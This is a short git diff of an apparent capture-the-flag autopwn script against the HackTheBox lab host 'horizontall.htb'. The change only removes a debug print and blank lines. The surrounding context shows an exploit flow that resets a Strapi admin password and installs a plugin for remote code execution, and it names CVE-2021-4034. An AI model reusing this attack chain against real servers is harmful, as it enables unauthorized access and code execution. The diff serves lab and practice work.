@@ -84,8 +84,6 @@ class Exploit:
 
 	r = requests.post(self.url+'/admin/plugins/install', json=data_plugin, headers=header)
 
-	print(r.text)
-
 autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')
 
 def main():
@@ -93,8 +91,6 @@ def main():
 	autopwn.reset_password()
 	autopwn.rce_starpi()
 	
-	
-
 if __name__ == '__main__':
 	try:
 		threading.Thread(target=main, args=()).start()
